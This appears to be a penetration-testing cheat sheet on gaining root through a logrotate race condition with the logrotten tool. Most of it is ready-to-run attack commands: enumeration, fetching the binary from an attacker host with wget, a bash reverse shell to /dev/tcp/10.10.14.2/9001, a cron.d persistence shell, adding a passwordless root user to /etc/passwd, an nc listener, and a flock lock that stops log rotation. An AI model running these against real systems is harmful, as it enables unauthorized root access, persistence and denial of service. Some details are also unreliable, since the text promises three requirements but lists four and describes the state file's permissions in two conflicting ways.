## Logrotate Privilege Escalation

The logrotten exploit wins a race condition that exists in logrotate after it renames a log file. During that brief window, an attacker who controls the log file path can replace the parent directory with a symlink to any target directory on the system, causing logrotate to write a file as root into that arbitrary location. 

***

## How the Race Condition Works

When logrotate rotates a log using the `create` or `compress` option, it: 

1. Renames the existing log file (e.g., `app.log` becomes `app.log.1`)
2. Creates a new empty log file in the same directory
3. Sends a signal to the application to reopen the log file

Between steps 1 and 2, there is a brief window where the directory no longer contains the original log file. The logrotten exploit races to replace the log directory with a symlink pointing to a sensitive target directory (such as `/etc/cron.d` or `/etc/bash_completion.d`). Logrotate then writes the new rotated file into that target directory as root, and the attacker owns that file, so they can write whatever content they want into it. 

***

## Requirements

All three conditions must be true simultaneously: 

- You have write permissions on a log file that logrotate is configured to rotate
- Logrotate runs as root (almost always true)
- A file-creating option is set in the logrotate config (`create`, `compress`, `copy`, `copytruncate`)
- Vulnerable logrotate version: `3.8.6`, `3.11.0`, `3.15.0`, or `3.18.0`

***

## Enumeration

```bash
# Check logrotate version
logrotate --version

# Find which option is active (create or compress determines the logrotten flag)
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# Look for log files you have write access to
find /var/log -writable 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null | grep -i log

# Review all logrotate configs for user-controllable log paths
ls /etc/logrotate.d/
cat /etc/logrotate.d/*

# Check when logrotate last ran and against which files
cat /var/lib/logrotate.status
```

***

## Setting Up logrotten

If the target has no internet access, compile on a machine with the same kernel version and transfer the binary. 

```bash
# On attack machine or directly on target if gcc is available
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten

# Transfer to target if compiled elsewhere
python3 -m http.server 8080
# On target:
wget http://10.10.14.2:8080/logrotten -O /tmp/logrotten
chmod +x /tmp/logrotten
```

***

## Exploitation

### Step 1: Prepare the Payload

```bash
# Simple reverse shell payload written to a file
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > /tmp/payload

# Alternative: add a root user to /etc/passwd
echo 'echo "hacker::0:0:root:/root:/bin/bash" >> /etc/passwd' > /tmp/payload

# Alternative: write to cron.d for persistence (no root login needed)
echo '* * * * * root bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > /tmp/payload
```

### Step 2: Start a Listener

```bash
# On your attack machine
nc -nlvp 9001
```

### Step 3: Run the Exploit

The flag to use depends on what option is set in logrotate.conf.

```bash
# If "create" is set
./logrotten -p /tmp/payload /path/to/writable/logfile

# If "compress" is set
./logrotten -p /tmp/payload -c /path/to/writable/logfile

# The tool waits, watching for logrotate to trigger, then races the symlink
```

For the exploit to fire, logrotate needs to actually run while logrotten is watching. You can trigger rotation manually if you have sudo access, or wait for the scheduled cron execution. 

```bash
# If you can trigger rotation manually
sudo /usr/sbin/logrotate -f /etc/logrotate.conf

# Otherwise just wait - check how frequently the cron calls it
grep logrotate /etc/cron* /etc/cron.d/* /var/spool/cron/* 2>/dev/null
```

***

## Target Directories for Payload Delivery

Logrotten drops the payload into the target directory, and you own the file. The choice of target determines when the payload executes: 

| Target Directory | Execution Trigger |
|---|---|
| `/etc/cron.d/` | On the cron schedule you define in the payload |
| `/etc/cron.hourly/` | Next hourly cron run |
| `/etc/bash_completion.d/` | Next time root opens a bash session |
| `/etc/profile.d/` | Next login session for any user |
| `/etc/sudoers.d/` | Immediate, on next sudo call |

Writing into `/etc/cron.d` is the most reliable approach because it does not require root to log in and fires on a predictable schedule without any user interaction. 

***

## CVE-2022-1348 (State File Misconfiguration)

A separate but related vulnerability affects logrotate versions before `3.20.0`.  When the state file `/var/lib/logrotate.status` does not yet exist, logrotate creates it world-readable, allowing any unprivileged user to acquire a lock on it indefinitely. This does not grant code execution directly, but it prevents logrotate from running at all, which can be used for denial-of-service or to stall log rotation as part of a broader attack chain. 

```bash
# Check if the state file exists and what permissions it has
ls -la /var/lib/logrotate.status

# If world-writable or absent, any user can lock it
flock /var/lib/logrotate.status sleep 9999 &
# logrotate will now fail to run until this lock is released
```
